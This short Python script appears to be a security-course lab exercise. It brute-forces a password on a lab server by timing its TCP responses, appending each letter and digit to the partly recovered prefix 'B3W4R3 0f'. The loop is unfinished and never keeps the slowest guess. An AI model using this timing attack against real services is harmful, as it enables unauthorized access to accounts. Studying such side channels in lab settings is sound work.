import time 
import socket

host = "ec521home.bu.edu"
port = 1234

choices = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pasword = "B3W4R3 0f"

# We dont know what the lengths of the password is 
# We check the length of the password by checking to see if all the times were they same after x chars 

def measure_time(password_guess):
    start_time = time.time()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(password_guess.encode() + b"\n")
        print(s.recv(1024))
    end_time = time.time()
    return end_time - start_time

if __name__ == "__main__":
    for _ in range(15):
        max_time = 0
        for letter in choices: 
            password_guess = pasword + letter 
            time_taken = measure_time(password_guess)
            print(f"Password guess: {password_guess} took {time_taken} seconds")

